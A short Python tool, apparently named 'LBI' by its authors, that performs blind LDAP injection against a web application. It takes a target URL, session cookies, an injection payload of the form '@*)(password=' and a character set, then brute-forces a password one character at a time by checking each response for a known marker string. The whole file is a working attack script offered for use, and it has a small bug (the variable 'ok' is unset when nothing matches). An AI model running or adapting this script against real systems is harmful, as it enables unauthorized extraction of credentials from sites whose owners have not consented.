import requests
import platform

art = '''        __        _______   ______ 
       /  |      /       \ /      |
       $$ |      $$$$$$$  |$$$$$$/ 
       $$ |      $$ |__$$ |  $$ |  
       $$ |      $$    $$<   $$ |  
       $$ |      $$$$$$$  |  $$ |  
       $$ |_____ $$ |__$$ | _$$ |_ 
       $$       |$$    $$/ / $$   |
       $$$$$$$$/ $$$$$$$/  $$$$$$/ 
                            
                            
       Made by Astika & léco.                   

'''
print(art)
url = input("Enter url:")
cook = input("Enter cookies : (Format = spip_session:209547_77454f7d6342c46fe7b13419249535be,uid:AAABAF7BG3QHlAMtBD+rAg==)\n")
val = input("Enter correct value to compare :\n")
cook_arr = cook.split(",")
my_cookies = {}
payload = input("Enter payload : (Format : @*)(password=)\n")
flag = True
dic = input("Enter dictionary : (Format : 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)\n")
passwd = ""
for i in range(len(cook_arr)):
    tmp = cook_arr[i].split(":")
    my_cookies[tmp[0]] = tmp[1]

print("In progress")    
while flag==True:
    flag = False
    for j in dic:
        req = url+payload+passwd+j
        res = requests.get(req,cookies=my_cookies)
        
        if val in res.text:
            passwd += j
            flag = True
            ok = 1
            break

if ok == 1:
    print("result : "+passwd)
else:
    print("No match found.")
